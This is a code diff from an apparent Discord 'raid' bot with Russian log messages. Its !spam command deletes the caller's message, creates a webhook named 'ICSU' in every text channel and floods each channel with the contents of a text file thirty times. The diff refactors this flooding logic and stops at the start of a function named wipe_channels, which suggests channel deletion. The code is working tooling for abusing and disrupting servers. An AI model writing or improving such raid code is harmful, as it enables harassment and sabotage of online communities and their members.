@@ -97,25 +97,26 @@ async def spm_hook(webhook):
     for i in range(30):
         try:
             async with async_open("text.txt","r", encoding="utf-8") as raid_txt:
-                await webhook.send(await raid_txt.read())
+                await webhook.send(
+                    await raid_txt.read()
+                )
         except:
             pass
+    log('+', f"Спам завершен в {webhook.channel}")
 
 async def create_hook(ctx):
-    for chan in ctx.guild.channels:
+    for chan in ctx.guild.text_channels:
         webhook = await chan.create_webhook(name='ICSU')
         async with async_open(ICON_PATH,'rb') as pfp:
             await webhook.edit(avatar=await pfp.read())
 
-        asyncio.create_task(spm_hook(webhook))  
+        asyncio.gather(spm_hook(webhook))
 
 @bot.command()
 async def spam(ctx):
     await ctx.message.delete()
-    print(Fore.YELLOW + "[~] Выполняется !spam")
-    asyncio.create_task(create_hook(ctx))
-    await asyncio.sleep(10)
-    print(Fore.GREEN + "[+] Спам завершен.")
+    log('~', "Спам выполняется...")
+    asyncio.gather(create_hook(ctx))
 
 
 async def wipe_channels(guild, create_one=False):
